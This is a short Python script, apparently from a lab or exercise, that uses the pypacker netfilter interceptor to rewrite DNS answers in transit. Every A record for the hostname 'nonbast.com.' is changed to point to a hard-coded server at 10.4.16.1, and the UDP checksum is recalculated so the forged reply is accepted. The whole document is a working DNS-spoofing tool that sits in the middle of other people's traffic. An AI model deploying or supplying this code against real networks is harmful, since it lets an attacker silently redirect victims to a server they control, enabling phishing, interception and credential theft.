#!/usr/bin/env python3

from pypacker import interceptor
from pypacker.layer3 import ip
from pypacker.layer4 import udp
from pypacker.layer567 import dns

TARGET_HOSTNAMES = ['nonbast.com.']
OUR_SERVER = bytes(int(x) for x in '10.4.16.1'.split('.'))

def verdict_cb(ll_data, ll_proto_id, data, ctx):
    ip1 = ip.IP(data)
    if dns.DNS in ip1:
        dns1 = ip1[dns.DNS]

        for answer in dns1.answers:
            if answer.type == dns.DNS_A and answer.name_s in TARGET_HOSTNAMES:
                print("Modified a DNS response for", answer.name_s)
                answer.address = OUR_SERVER

        # force recalculation of UDP checksum, seems to be a bug in pypacker
        ip1[udp.UDP]._calc_sum()

    return ip1.bin(True), interceptor.NF_ACCEPT

ictor = interceptor.Interceptor()
try:
    ictor.start(verdict_cb, queue_ids=[0])
except KeyboardInterrupt:
    ictor.stop()
